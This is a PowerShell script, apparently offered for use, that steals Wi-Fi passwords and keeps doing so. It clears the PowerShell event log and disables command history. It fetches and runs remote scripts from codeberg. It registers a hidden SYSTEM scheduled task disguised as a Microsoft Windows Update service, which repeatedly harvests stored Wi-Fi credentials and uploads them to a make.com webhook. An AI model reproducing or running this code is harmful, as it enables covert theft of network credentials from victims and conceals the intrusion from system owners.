# Persistently Reap Passwords from system.
# Variables.
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$cleanup = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/Sanitation/WifiPersistentDataReaperPurge.ps1"
$STName = "Windows Update Service For Wlan Drivers"

############### Scripts starts from here.
# Cleanup.
Invoke-Expression (Invoke-WebRequest -Uri $cleanup -UseBasicParsing).Content

# Task creation
$rawscript = @'
$regPath = "HKLM:\Software\WindowsUpdateService"
$code = (Get-ItemProperty -Path $regPath).Code
$basepath = "C:\Windows\System32\SecureBootUpdatesMicrosoft"
$apiurl = "https://hook.eu2.make.com/pgvj9kxtwo4pcrhxwn1kg9p9agp129bl"
$squidurl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/WifiRelated/WifiSquid.ps1"
$finaloutput = Join-Path -Path $basepath -ChildPath "persistentwifi-$code.txt"
$boundary = [System.Guid]::NewGuid().ToString()
$fileBytes = [System.IO.File]::ReadAllBytes($finaloutput)
$fileName = [System.IO.Path]::GetFileName($finaloutput)
$LF = "`r`n"
$body = (
    "--$boundary$LF" +
    "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$LF" +
    "Content-Type: application/octet-stream$LF$LF" +
    [System.Text.Encoding]::Default.GetString($fileBytes) + $LF +
    "--$boundary--$LF"
)
$bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
$newFilePath = Join-Path -Path $basepath -ChildPath "persistentwifi-$code-raw.txt"
Invoke-RestMethod -Uri $squidurl | Invoke-Expression | Out-file -FilePath $newFilePath
$previousValues = ""
if (Test-Path $finaloutput) {
    $previousValues = Get-Content -Path $finaloutput -Raw
}
$newValues = Get-Content -Path $newFilePath -Raw
if ($newValues -ne $previousValues -or [string]::IsNullOrWhiteSpace($previousValues)) {
    Move-Item -Path $newFilePath -Destination $finaloutput -Force
    Invoke-WebRequest -Uri $apiurl -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyBytes -UseBasicParsing | Out-Null
} else {
    Remove-Item -Path $newFilePath -Force
}
'@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($rawscript)
$enccmd = [Convert]::ToBase64String($bytes)

# Actions for scheduled task.
$STAction = New-ScheduledTaskAction `
    -Execute 'powershell.exe' `
    -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $enccmd"

# Triggers for scheduled task.
$STTrigger = New-ScheduledTaskTrigger `
    -Once -At ([DateTime]::Now.AddSeconds(10)) `
    -RepetitionDuration (New-TimeSpan -Days (365*50)) `
    -RepetitionInterval (New-TimeSpan -Minutes 30) 

# Settings for scheduled task
$STSettings = New-ScheduledTaskSettingsSet `
    -Compatibility Win8 `
    -MultipleInstances IgnoreNew `
    -RestartInterval (New-TimeSpan -Minutes 30) `
    -RestartCount:9999 `
    -ExecutionTimeLimit:0 `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -DisallowHardTerminate `
    -Priority 0 `
    -Hidden 

# Registering the scheduled task.
if (Get-ScheduledTask -TaskName $STName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $STName -Confirm:$false -ErrorAction SilentlyContinue
}
Register-ScheduledTask `
    -Action $STAction `
    -Trigger $STTrigger `
    -Settings $STSettings `
    -TaskName $STName `
    -Description "Windows Server Update Services, previously known as Software Update Services, is a computer program and network service developed by Microsoft Corporation that enables administrators to manage the distribution of updates and hotfixes released for Microsoft products to computers in a corporate environment." `
    -User "NT AUTHORITY\SYSTEM" `
    -RunLevel Highest | Out-Null

# Post Registration settings.
$TargetTask = Get-ScheduledTask -TaskName $STName -ErrorAction SilentlyContinue
$TargetTask.Author = 'Microsoft Corporation'
$TargetTask.Settings.volatile = $False
$TargetTask | Set-ScheduledTask | Out-Null